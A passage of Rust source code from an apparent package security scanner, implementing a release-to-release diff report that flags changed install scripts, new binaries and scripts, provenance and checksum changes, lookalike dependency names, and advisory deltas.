    pub to_publisher: Option<String>,
    /// Advisories that affect only the new release.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub new_advisories: Vec<crate::osv::Advisory>,
    /// Advisories that affected only the previous release.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub resolved_advisories: Vec<crate::osv::Advisory>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub not_checked: Vec<String>,
}

impl DiffReport {
    pub fn verdict(&self) -> crate::model::Severity {
        self.findings
            .iter()
            .map(|finding| finding.severity)
            .chain(self.new_advisories.iter().map(|advisory| advisory.severity))
            .max()
            .unwrap_or(crate::model::Severity::Info)
    }

    pub fn exit_code(&self) -> u8 {
        self.verdict().exit_code()
    }
}

fn integrity_label(integrity: &Integrity) -> String {
    match integrity {
        Integrity::Verified => "verified".to_string(),
        Integrity::Unverified => "unverified".to_string(),
        Integrity::Mismatch { expected, actual } => {
            format!("MISMATCH (expected {expected}, got {actual})")
        }
    }
}

fn compare_files(
    old: &[crate::archive::ExtractedFile],
    new: &[crate::archive::ExtractedFile],
) -> (Vec<String>, Vec<String>, Vec<String>, usize) {
    use std::collections::BTreeMap;
    let old_map: BTreeMap<&str, &str> = old
        .iter()
        .map(|file| (file.path.as_str(), file.text.as_str()))
        .collect();
    let new_map: BTreeMap<&str, &str> = new
        .iter()
        .map(|file| (file.path.as_str(), file.text.as_str()))
        .collect();

    let added = new_map
        .keys()
        .filter(|path| !old_map.contains_key(**path))
        .map(|path| path.to_string())
        .collect();
    let removed = old_map
        .keys()
        .filter(|path| !new_map.contains_key(**path))
        .map(|path| path.to_string())
        .collect();
    let modified = new_map
        .iter()
        .filter(|(path, text)| old_map.get(**path).is_some_and(|old| old != *text))
        .map(|(path, _)| path.to_string())
        .collect();
    let unchanged = new_map
        .iter()
        .filter(|(path, text)| old_map.get(**path).is_some_and(|old| old == *text))
        .count();
    (added, removed, modified, unchanged)
}

const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];

fn package_json_path(
    files: &[crate::archive::ExtractedFile],
) -> Option<&crate::archive::ExtractedFile> {
    files
        .iter()
        .find(|file| file.path == "package/package.json")
        .or_else(|| {
            files
                .iter()
                .find(|file| file.path.ends_with("package.json"))
        })
}

fn install_scripts(
    files: &[crate::archive::ExtractedFile],
) -> Option<std::collections::BTreeMap<String, String>> {
    let file = package_json_path(files)?;
    let value: serde_json::Value = serde_json::from_str(&file.text).ok()?;
    let scripts = value.get("scripts")?.as_object()?;
    let hooks = scripts
        .iter()
        .filter(|(hook, _)| INSTALL_HOOKS.contains(&hook.as_str()))
        .filter_map(|(hook, command)| {
            command
                .as_str()
                .map(|command| (hook.clone(), command.to_string()))
        })
        .collect();
    Some(hooks)
}

/// A version that changes or adds an install hook changed what runs during
/// install. A risky command escalates to HIGH.
fn install_script_findings(
    old: &[crate::archive::ExtractedFile],
    new: &[crate::archive::ExtractedFile],
) -> Vec<crate::rules::RuleFinding> {
    let Some(previous) = install_scripts(old) else {
        return Vec::new();
    };
    let Some(current) = install_scripts(new) else {
        return Vec::new();
    };
    let changed: Vec<(&String, &String)> = current
        .iter()
        .filter(|(hook, command)| previous.get(*hook) != Some(*command))
        .collect();
    if changed.is_empty() {
        return Vec::new();
    }
    let risky = changed
        .iter()
        .any(|(_, command)| crate::signals::risky_install_command(command));
    let file = package_json_path(new)
        .map(|file| file.path.clone())
        .unwrap_or_else(|| "package.json".to_string());
    vec![crate::rules::RuleFinding {
        rule: "DIFF-INSTALL-SCRIPTS-001",
        title: "this release changed an install script",
        description: "The new version runs a different command during installation.",
        severity: if risky {
            crate::model::Severity::High
        } else {
            crate::model::Severity::Warn
        },
        confidence: crate::model::Confidence::High,
        file,
        line: 1,
        evidence: changed
            .iter()
            .map(|(hook, command)| {
                format!("{hook}: {}", command.chars().take(120).collect::<String>())
            })
            .collect::<Vec<_>>()
            .join("; "),
        recommendation: "Review the new install command before updating.",
        references: vec!["https://docs.npmjs.com/cli/v10/using-npm/scripts"],
    }]
}

fn new_binary_findings(
    old: &crate::archive::Extracted,
    new: &crate::archive::Extracted,
) -> Vec<crate::rules::RuleFinding> {
    new.binaries
        .iter()
        .filter(|path| !old.binaries.contains(path))
        .map(|path| crate::rules::RuleFinding {
            rule: "DIFF-NEW-BINARY-001",
            title: "this release adds a binary file",
            description: "A binary appeared that the previous release did not ship.",
            severity: crate::model::Severity::Info,
            confidence: crate::model::Confidence::Medium,
            file: path.clone(),
            line: 0,
            evidence: "(binary file, not scanned as text)".to_string(),
            recommendation: "Confirm the binary is expected and built from this source.",
            references: vec!["https://slsa.dev/"],
        })
        .collect()
}

/// New shell scripts and shebang files are worth a line in a release diff.
fn new_script_findings(
    new_files: &[crate::archive::ExtractedFile],
    added: &[String],
) -> Vec<crate::rules::RuleFinding> {
    let by_path: std::collections::BTreeMap<&str, &str> = new_files
        .iter()
        .map(|file| (file.path.as_str(), file.text.as_str()))
        .collect();
    added
        .iter()
        .filter_map(|path| {
            let text = by_path.get(path.as_str())?;
            let shell = path.ends_with(".sh")
                || path.ends_with(".bash")
                || path.ends_with(".ps1")
                || path.ends_with(".bat");
            let shebang = text.starts_with("#!");
            if !shell && !shebang {
                return None;
            }
            Some(crate::rules::RuleFinding {
                rule: "DIFF-NEW-SCRIPT-001",
                title: "this release adds an executable script",
                description: "A new shell or shebang file appeared since the previous release.",
                severity: crate::model::Severity::Warn,
                confidence: crate::model::Confidence::Medium,
                file: path.clone(),
                line: 1,
                evidence: text
                    .lines()
                    .next()
                    .unwrap_or_default()
                    .chars()
                    .take(160)
                    .collect(),
                recommendation: "Review the new script before installing the update.",
                references: vec!["https://owasp.org/www-community/attacks/Command_Injection"],
            })
        })
        .collect()
}

/// Trust-signal deltas that are not file findings: publisher, provenance,
/// integrity, and declared dependencies.
fn trust_findings(
    ecosystem: Ecosystem,
    old: &Prepared,
    new: &Prepared,
) -> Vec<crate::rules::RuleFinding> {
    use crate::model::{Confidence, Severity};

    let mut findings = Vec::new();
    if let (Some(previous), Some(current)) = (&old.publisher, &new.publisher)
        && !previous.eq_ignore_ascii_case(current)
    {
        findings.push(crate::rules::RuleFinding {
            rule: "DIFF-PUBLISHER-001",
            title: "publisher identity changed",
            description: "A different npm account published this release.",
            severity: Severity::Info,
            confidence: Confidence::High,
            file: "package.json".to_string(),
            line: 1,
            evidence: format!("publisher: {previous} -> {current}"),
            recommendation: "Confirm the account is expected before updating.",
            references: vec!["https://docs.npmjs.com/cli/v10/commands/npm-view"],
        });
    }

    if ecosystem == Ecosystem::Npm {
        let previous = old.provenance.as_ref();
        let current = new.provenance.as_ref();
        let previous_verified = previous.is_some_and(|report| report.verified());
        match (previous, current) {
            (Some(previous), None) if previous.verified() => findings.push(crate::rules::RuleFinding {
                rule: "DIFF-PROVENANCE-001",
                title: "this release dropped provenance",
                description: "The previous release published a verifiable attestation; this one publishes none.",
                severity: Severity::Warn,
                confidence: Confidence::High,
                file: String::new(),
                line: 0,
                evidence: format!(
                    "previous signer: {}",
                    previous.identity.as_deref().unwrap_or("(identity unreadable)")
                ),
                recommendation: "Treat the publishing-pipeline change as unreviewed until explained.",
                references: vec![
                    "https://docs.npmjs.com/generating-provenance-statements",
                    "https://slsa.dev/spec/v1.0/verifying-artifacts",
                ],
            }),
            (Some(previous), Some(current))
                if previous.verified() && !current.verified() =>
            {
                findings.push(crate::rules::RuleFinding {
                    rule: "DIFF-PROVENANCE-002",
                    title: "provenance no longer verifies",
                    description: "An attestation is still published, but it no longer passes offline verification.",
                    severity: Severity::Warn,
                    confidence: Confidence::High,
                    file: String::new(),
                    line: 0,
                    evidence: format!(
                        "reason: {}",
                        current.reason.as_deref().unwrap_or("verification failed")
                    ),
                    recommendation: "Do not treat presence as verification; review the release.",
                    references: vec!["https://docs.npmjs.com/generating-provenance-statements"],
                });
            }
            (Some(previous), Some(current))
                if previous.verified()
                    && current.verified()
                    && previous.identity != current.identity =>
            {
                findings.push(crate::rules::RuleFinding {
                    rule: "DIFF-PROVENANCE-003",
                    title: "signing identity changed",
                    description: "Both releases verify, but a different certificate identity signed this one.",
                    severity: Severity::Warn,
                    confidence: Confidence::High,
                    file: String::new(),
                    line: 0,
                    evidence: format!(
                        "{} -> {}",
                        previous.identity.as_deref().unwrap_or("(none)"),
                        current.identity.as_deref().unwrap_or("(none)")
                    ),
                    recommendation: "Confirm the new workflow is allowed to publish this package.",
                    references: vec!["https://slsa.dev/spec/v1.0/verifying-artifacts"],
                });
            }
            (_previous, Some(current)) if !previous_verified && current.verified() => {
                findings.push(crate::rules::RuleFinding {
                    rule: "DIFF-PROVENANCE-004",
                    title: "this release added verifiable provenance",
                    description: "The new release publishes an attestation that verifies offline.",
                    severity: Severity::Info,
                    confidence: Confidence::High,
                    file: String::new(),
                    line: 0,
                    evidence: format!(
                        "signer: {}",
                        current.identity.as_deref().unwrap_or("(identity unreadable)")
                    ),
                    recommendation: "No action; this is an improvement.",
                    references: vec!["https://docs.npmjs.com/generating-provenance-statements"],
                });
            }
            _ => {}
        }
    }

    for (label, integrity) in [
        ("previous release", &old.integrity),
        ("this release", &new.integrity),
    ] {
        if let Integrity::Mismatch { expected, actual } = integrity {
            findings.push(crate::rules::RuleFinding {
                rule: "DIFF-INTEGRITY-001",
                title: "archive checksum does not match the registry",
                description: "Downloaded bytes differ from the release the registry published.",
                severity: Severity::High,
                confidence: Confidence::High,
                file: String::new(),
                line: 0,
                evidence: format!("{label}: expected {expected}, got {actual}"),
                recommendation: "Do not install; the download does not match its published release.",
                references: vec!["https://docs.npmjs.com/about-registry-signatures"],
            });
        }
    }
    if matches!(old.integrity, Integrity::Verified)
        && matches!(new.integrity, Integrity::Unverified)
    {
        findings.push(crate::rules::RuleFinding {
            rule: "DIFF-INTEGRITY-002",
            title: "this release has no published checksum",
            description: "The previous release could be verified; this one cannot.",
            severity: Severity::Warn,
            confidence: Confidence::High,
            file: String::new(),
            line: 0,
            evidence: "registry published no checksum for the new archive".to_string(),
            recommendation: "Verify the download through another trusted channel.",
            references: vec!["https://docs.npmjs.com/about-registry-signatures"],
        });
    }

    findings
}

fn declared_dependencies(
    files: &[crate::archive::ExtractedFile],
) -> Option<std::collections::BTreeMap<String, String>> {
    let file = package_json_path(files)?;
    let value: serde_json::Value = serde_json::from_str(&file.text).ok()?;
    let mut out = std::collections::BTreeMap::new();
    for field in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        let Some(map) = value.get(field).and_then(serde_json::Value::as_object) else {
            continue;
        };
        for (name, range) in map {
            out.insert(name.clone(), range.as_str().unwrap_or_default().to_string());
        }
    }
    Some(out)
}

fn dependency_findings(old: &Prepared, new: &Prepared) -> Vec<crate::rules::RuleFinding> {
    use crate::model::{Confidence, Severity};

    let (Some(previous), Some(current)) = (
        declared_dependencies(&old.extracted.files),
        declared_dependencies(&new.extracted.files),
    ) else {
        return Vec::new();
    };
    let added: Vec<&String> = current
        .keys()
        .filter(|name| !previous.contains_key(*name))
        .collect();
    let removed: Vec<&String> = previous
        .keys()
        .filter(|name| !current.contains_key(*name))
        .collect();
    if added.is_empty() && removed.is_empty() {
        return Vec::new();
    }
    let suspicious: Vec<(&String, &str)> = added
        .iter()
        .filter_map(|name| {
            let suspect = crate::typosquat::closest(name, crate::typosquat::popular_npm(), &[])?;
            (suspect.homoglyph || suspect.distance <= 1).then_some((*name, suspect.candidate))
        })
        .collect();
    let mut evidence = Vec::new();
    if !added.is_empty() {
        evidence.push(format!(
            "added: {}",
            added
                .iter()
                .map(|name| name.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }
    if !removed.is_empty() {
        evidence.push(format!(
            "removed: {}",
            removed
                .iter()
                .map(|name| name.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }
    for (name, candidate) in &suspicious {
        evidence.push(format!("{name} resembles the popular package {candidate}"));
    }
    vec![crate::rules::RuleFinding {
        rule: "DIFF-DEPENDENCIES-001",
        title: "declared dependencies changed",
        description: "The new release adds or removes dependencies from its package.json.",
        severity: if suspicious.is_empty() {
            Severity::Info
        } else {
            Severity::Warn
        },
        confidence: if suspicious.is_empty() {
            Confidence::High
        } else {
            Confidence::Medium
        },
        file: "package.json".to_string(),
        line: 1,
        evidence: evidence.join("; "),
        recommendation: "Review new dependency names before updating.",
        references: vec![
            "https://docs.npmjs.com/cli/v10/configuring-npm/package-json#dependencies",
        ],
    }]
}

fn advisory_keys(advisory: &crate::osv::Advisory) -> impl Iterator<Item = &str> {
    std::iter::once(advisory.id.as_str()).chain(advisory.aliases.iter().map(String::as_str))
}

fn diff_advisories(
    old: Option<&crate::osv::AdvisoryList>,
    new: Option<&crate::osv::AdvisoryList>,
) -> (
    Vec<crate::osv::Advisory>,
    Vec<crate::osv::Advisory>,
    Option<&'static str>,
) {
    use std::collections::HashSet;

    match (old, new) {
        (Some(old), Some(new)) => {
            let old_keys: HashSet<&str> = old.advisories.iter().flat_map(advisory_keys).collect();
            let new_keys: HashSet<&str> = new.advisories.iter().flat_map(advisory_keys).collect();
            let added = new
                .advisories
                .iter()
                .filter(|advisory| advisory_keys(advisory).all(|key| !old_keys.contains(key)))
                .cloned()
                .collect();
            let resolved = old
                .advisories
                .iter()
                .filter(|advisory| advisory_keys(advisory).all(|key| !new_keys.contains(key)))
                .cloned()
                .collect();
            (added, resolved, None)
        }
        (None, Some(_)) => (
            Vec::new(),
            Vec::new(),
            Some("advisory delta (the previous release could not be checked)"),
        ),
        (Some(_), None) => (
            Vec::new(),
            Vec::new(),
            Some("advisory delta (this release could not be checked)"),
        ),
        (None, None) => (
            Vec::new(),
            Vec::new(),
            Some("advisory delta (neither release could be checked)"),
        ),
    }
}

#[allow(clippy::too_many_arguments)]
pub fn build_diff(
    ecosystem: Ecosystem,
    name: &str,
    from_spec: &PackageSpec,
    to_spec: &PackageSpec,
    old: &Prepared,
    new: &Prepared,
    disabled_rules: &[String],
    old_advisories: Option<&crate::osv::AdvisoryList>,
    new_advisories: Option<&crate::osv::AdvisoryList>,
) -> DiffReport {
    let (added, removed, modified, unchanged) =
        compare_files(&old.extracted.files, &new.extracted.files);

    let old_findings = crate::rules::scan_with(&old.extracted.files, disabled_rules);
    let new_findings = crate::rules::scan_with(&new.extracted.files, disabled_rules);
    let key = |finding: &crate::rules::RuleFinding| (finding.rule, finding.file.clone());
    let old_keys: std::collections::HashSet<_> = old_findings.iter().map(key).collect();
    let new_keys: std::collections::HashSet<_> = new_findings.iter().map(key).collect();

    let mut findings: Vec<_> = new_findings
        .iter()
        .filter(|finding| !old_keys.contains(&key(finding)))
        .cloned()
        .collect();
    findings.extend(install_script_findings(
        &old.extracted.files,
        &new.extracted.files,
    ));
    findings.extend(new_script_findings(&new.extracted.files, &added));
    findings.extend(new_binary_findings(&old.extracted, &new.extracted));
    findings.extend(trust_findings(ecosystem, old, new));
    findings.extend(dependency_findings(old, new));
    if let Some(finding) = crate::rules::partially_scanned(&old.extracted, "previous release: ") {
        findings.push(finding);
    }
    if let Some(finding) = crate::rules::partially_scanned(&new.extracted, "this release: ") {
        findings.push(finding);
    }
    if let Some(limit) = old.decompression_limit {
        findings.push(decompression_finding(limit, "previous release: "));
    }
    if let Some(limit) = new.decompression_limit {
        findings.push(decompression_finding(limit, "this release: "));
    }
    let resolved: Vec<_> = old_findings
        .into_iter()
        .filter(|finding| !new_keys.contains(&key(finding)))
        .collect();
    let (added_advisories, resolved_advisories, advisory_gap) =
        diff_advisories(old_advisories, new_advisories);
    findings.sort_by(|left, right| {
        left.file
            .cmp(&right.file)
            .then(left.line.cmp(&right.line))
            .then(left.rule.cmp(right.rule))
    });

    let mut not_checked = Vec::new();
    if new.extracted.files.is_empty() {
        not_checked.push("source analysis (no text files in the new archive)".to_string());
    }
    if matches!(new.integrity, Integrity::Unverified) {
        not_checked.push("archive checksum (registry publishes none)".to_string());
    }
    if let Some(gap) = advisory_gap {
        not_checked.push(gap.to_string());
    }
    if old_advisories.is_some_and(|list| list.hidden > 0)
        || new_advisories.is_some_and(|list| list.hidden > 0)
    {
        not_checked.push("advisory delta (one list was truncated at the cap)".to_string());
    }
    if old_advisories.is_some_and(|list| list.stale_seconds.is_some())
        || new_advisories.is_some_and(|list| list.stale_seconds.is_some())
    {
        not_checked.push("advisory delta (served from stale cache)".to_string());
    }

    DiffReport {
        ecosystem,
        name: name.to_string(),
        from_version: from_spec.version.clone().unwrap_or_default(),
        to_version: to_spec.version.clone().unwrap_or_default(),
        from_integrity: integrity_label(&old.integrity),
        to_integrity: integrity_label(&new.integrity),
        added,
        removed,
        modified,
        unchanged,
        findings,
        resolved,
        from_publisher: old.publisher.clone(),
        to_publisher: new.publisher.clone(),
        new_advisories: added_advisories,
        resolved_advisories,
        not_checked,
    }
}
